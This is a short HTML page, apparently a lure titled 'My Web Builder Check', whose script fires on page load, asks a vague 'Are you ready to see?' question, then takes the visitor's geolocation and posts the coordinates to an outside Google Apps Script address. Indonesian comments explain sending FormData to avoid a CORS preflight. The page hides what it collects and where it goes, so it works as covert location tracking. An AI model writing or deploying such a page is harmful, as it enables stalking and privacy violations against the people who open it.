<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>My Web Builder Check</title>
</head>
<body>

<script>
    window.onload = function () {
        const confirmShare = confirm("Are you ready to see?");
        if (!confirmShare) return;

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {

                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    // FormData AGAR TIDAK PRE-FLIGHT → tidak CORS
                    const formData = new FormData();
                    formData.append("latitude", latitude);
                    formData.append("longitude", longitude);

                    fetch("https://script.google.com/macros/s/AKfycbyuy9_iBBMwYzffXUakAiDuJByZJ7vSlVcfIZ3nhN5fScPwJy3_jRmDgX_-LvMaW7GGAA/exec", {
                        method: "POST",
                        body: formData   // ❗ Tidak pakai JSON
                    })
                    .then(r => r.text())
                    .then(console.log)
                    .catch(console.error);

                },
                (error) => {
                    console.error("Gagal mendapatkan lokasi:", error.message);
                }
            );
        }
    }
</script>

</body>
</html>
